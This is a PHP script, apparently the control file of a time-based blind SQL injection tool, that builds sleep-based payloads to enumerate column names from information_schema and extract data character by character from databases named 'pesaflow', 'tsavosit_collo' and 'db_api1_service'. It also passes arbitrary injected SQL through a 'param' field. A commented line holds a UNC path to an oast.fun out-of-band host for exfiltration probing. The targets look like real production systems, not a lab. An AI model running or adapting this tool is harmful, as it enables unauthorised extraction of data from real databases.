<?php
include './includes/sql_conn.php';
$word = "pesaflow";
//$word = "\\\\kotnova.chp0eah2vtc0000dnx6gge5y8fcyyyyyb.oast.fun\\a";
$hex = '0x' . bin2hex($word);
$date1 = date('H:i:s');
if (isset($_GET['ch'])) {
    $dt1 = json_decode(base64_decode($_GET['ch']), true);
    foreach ($dt1 as $id => $key) {
        $_POST[$id] = $key;
    }
}
//echo json_encode($_POST);
//exit();


if (isset($_POST['table']) && !isset($_POST['column'])) {
    echo 'Table needed to process query!';
} else {
    //echo $date1. PHP_EOL;
    //$func = 'L';
    /*
    if (isset($_POST['func'])) {
        if ($_POST['func'] == 'L' || $_POST['func'] == 'l') {
            $func = 'L';
        } elseif ($_POST['func'] == 'C' || $_POST['func'] == 'c') {
            $func = 'C';
        } else {
            $func = 'C';
        }
    } else {
        $func = 'C';
    }
*/
    $func = $_POST['func'];
    if ($func == 'L') {
        $verif = json_decode(file_get_contents('./pftb2/tableColumns.json'), true);
        if (isset($verif[$_POST['table']]) && !isset($_POST['column'])) {
            echo 'Data already queried';
        } else {
            $table = $_POST['table'];

            if (isset($_POST['column'])) {
                $column = $_POST['column'];
            } else {
                $column = 1;
            }


            $length = '9';

            if (isset($_POST['target'])) {
                $target = $_POST['target'];
            } else {
                $target = '1';
            }


            if (isset($_POST['method'])) {
                if ($_POST['method'] == 1) {
                    $tbColumnsTotal = $_POST['column'];
                } else {
                    $tbColumnsTotal = $tableDataMod[$table]['length'];
                }
            } else {
                $tbColumnsTotal = $tableDataMod[$table]['length'];
            }


            $tb_name = $tableDataMod[$table]['name'];
            $i = 'VALID QUERY';


            $tb_column = $column - 1;
            if ($target == '1') {
                $db_name = 'pesaflow';
                $targetp = 1;
            } else {
                $db_name = 'tsavosit_collo';
                $targetp = 2;
            }
            if (isset($_POST['sleep'])) {
                $sleepp = $_POST['sleep'];
            } else {
                $sleepp = 5;
            }


            $charposp = 0;
            $paramp = "(SELECT(COLUMN_NAME)FROM(information_schema.columns)WHERE(table_schema='" . $db_name . "'AND(table_name='" . $tb_name . "'))ORDER%20BY(COLUMN_NAME)LIMIT%201%20OFFSET%20" . $tb_column . ")";

            $qq1 = [
                'charpos' => $charposp,
                'param' => $paramp,
                'target' => $targetp,
                'sleep' => $sleepp,
                's_time' => $date1
            ];
            $qq2 = base64_encode(json_encode($qq1));

            $state = [
                'id' => 2,
                'page' => 'sql_lab.php',
                'message' => 'VALID QUERY',
                'tb' => $table,
                'charpos' => $charposp,
                'cl' => $column,
                'lngth' => $length,
                'ttcm' => $tbColumnsTotal, //loop moderator & controller
                'f' => $func,
                'query' => $qq2
            ];

            echo length_finder($sleepp, $targetp, $paramp, $state) . '<BR/>'.PHP_EOL;
        }
    } elseif ($func == 'C') {
        $dfile = './pftb2/data/' . $_POST['table'] . '_ColumnNames.json';
        if (file_exists($dfile)) {
            $verif = json_decode(file_get_contents($dfile), true);
        } else {
            $verif = [];
        }

        if (!isset($_POST['column'])) {
            exit('Column name needed to process query!');
        }

        $vrfil = './pftb2/tableColumns.json';
        $vrfil_data = json_decode(file_get_contents($vrfil), true);

        if (!isset($vrfil_data[$_POST['table']][$_POST['column']])) {
            exit('Column or table queried is not available!');
        } else {
            $length = $vrfil_data[$_POST['table']][$_POST['column']];
        }

        if (isset($verif[$_POST['table']][$_POST['column']]) && !isset($_POST['position']) && count($verif[$_POST['table']][$_POST['column']]) == $length) {
            if (count($verif[$_POST['table']][$_POST['column']]) == $length) {
                exit('Table and column completely queried!');
            } else {
                exit('Table and column already queried!');
            }
        } else {

            $table = $_POST['table'];

            if (isset($verif[$_POST['table']][$_POST['column']])) {
                $column = count($verif[$_POST['table']][$_POST['column']]) + 1;
            } else {

                $column = $_POST['column'];
            }

            // $column = 1;


            if (isset($_POST['target'])) {
                $target = $_POST['target'];
            } else {
                $target = '1';
            }


            //$tbColumnsTotal = $tableDataMod[$table]['length'] - 1;
            $tbColumnsTotal = $tableDataMod[$table]['length'];

            $tb_name = $tableDataMod[$table]['name'];
            $i = 'VALID QUERY';


            $tb_column = $column - 1;
            if ($target == '1') {
                $db_name = 'pesaflow';
                $targetp = 1;
            } else {
                $db_name = 'tsavosit_collo';
                $targetp = 2;
            }


            if (isset($_POST['sleep'])) {
                $sleepp = $_POST['sleep'];
            } else {
                $sleepp = 5;
            }
            $charposp = 1;

            $paramp = "(SELECT(COLUMN_NAME)FROM(information_schema.columns)WHERE(table_schema='" . $db_name . "'AND(table_name='" . $tb_name . "'))ORDER%20BY(COLUMN_NAME)LIMIT%201%20OFFSET%20" . $tb_column . ")";


            $qq1 = [
                'charpos' => $charposp,
                'param' => $paramp,
                'target' => $targetp,
                'sleep' => $sleepp,
                's_time' => $date1
            ];
            $qq2 = base64_encode(json_encode($qq1));

            $state = [
                'id' => 2,
                'page' => 'sql_lab.php',
                'message' => 'VALID QUERY',
                'tb' => $table,
                'charpos' => $charposp,
                'cl' => $column,
                'lngth' => $length, //loop moderator & controller
                'ttcm' => $tbColumnsTotal,
                'f' => $func,
                'query' => $qq2
            ];

            echo character_finder($charposp, $paramp, $targetp, $sleepp, $state) . '<BR/>'.PHP_EOL;
        }
    } else {

        if (!isset($_POST['param'])) {
            exit('Parameter commanded needed to process query!');
        }

        $finderp = intval($_POST['finder']);

        $length = intval($_POST['length']);

        // $column = 1;
        if (isset($_POST['target'])) {
            $target = $_POST['target'];
        } else {
            $target = '3';
        }

        $i = 'VALID QUERY';

        if ($target == '1') {
            $db_name = 'pesaflow';
            $targetp = 1;
        } elseif($target == '2') {
            $db_name = 'tsavosit_collo';
            $targetp = 2;
        } else{
            $db_name = 'db_api1_service';
            $targetp = 3;
        }

        if (isset($_POST['sleep'])) {
            $sleepp = $_POST['sleep'];
        } else {
            $sleepp = 5;
        }

        if(isset($_POST['charposp'])){
            $charposp = intval($_POST['charposp']);
        }else{
             $charposp = 1;
        }
       

        $paramp = $_POST['param'];

        $qq1 = [
            'charpos' => $charposp,
            'param' => $paramp,
            'target' => $targetp,
            'sleep' => $sleepp,
            's_time' => $date1
        ];

        $qq2 = base64_encode(json_encode($qq1));

        $state = [
            'id' => 2,
            'page' => 'sql_lab.php',
            'message' => $finderp,
            'tb' => 1,
            'charpos' => $charposp,
            'cl' => 1,
            'lngth' => $length, //loop moderator & controller
            'ttcm' => 0,
            'f' => $func,
            'query' => $qq2
        ];
        //echo json_encode($state);
        // echo json_encode($_POST);
        echo character_finder($charposp, $paramp, $targetp, $sleepp, $state) . '<BR/>'.PHP_EOL;

        /*
        if ($finderp === 1) {
            echo character_finder($charposp, $paramp, $targetp, $sleepp, $state) . '<BR/>'.PHP_EOL;
        } elseif ($finderp == 2) {
            echo character_finder2($charposp, $paramp, $targetp, $sleepp, $state) . '<BR/>'.PHP_EOL;
        } elseif ($finderp == 3) {
            echo character_finder_punctuation($charposp, $paramp, $targetp, $sleepp, $state) . '<BR/>'.PHP_EOL;
        } elseif ($finderp == 4) {
            echo character_finder_special($charposp, $paramp, $targetp, $sleepp, $state) . '<BR/>'.PHP_EOL;
        } else{
            exit('Unknown Finder Function!');
        }
        //*/
    }
}
